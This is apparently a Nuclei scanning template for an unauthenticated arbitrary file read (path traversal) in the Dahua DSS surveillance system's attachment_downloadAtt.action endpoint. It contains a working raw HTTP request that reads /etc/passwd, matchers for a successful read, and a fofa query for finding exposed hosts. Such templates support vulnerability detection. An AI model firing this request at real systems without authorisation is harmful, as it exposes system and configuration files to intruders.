id: dahuaDSS-attachment_downloadAtt_action-File-reading-XVE-2024-34436

info:
  name: 大华DSS数字监控系统 attachment_downloadAtt.action 任意文件读取漏洞(XVE-2024-34436)
  author: unknown
  severity: high
  description: |-
    fofa: app="dahua-DSS"
    大华DSS数字监控系统 attachment_downloadByUrlAtt.action接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
  tags: File reading


http:
  - raw:
      - |
        GET /portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
        Accept-Encoding: gzip, deflate
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'root:'
          - '/bin/bash'
        condition: and
      - type: status
        status: 
          - 200

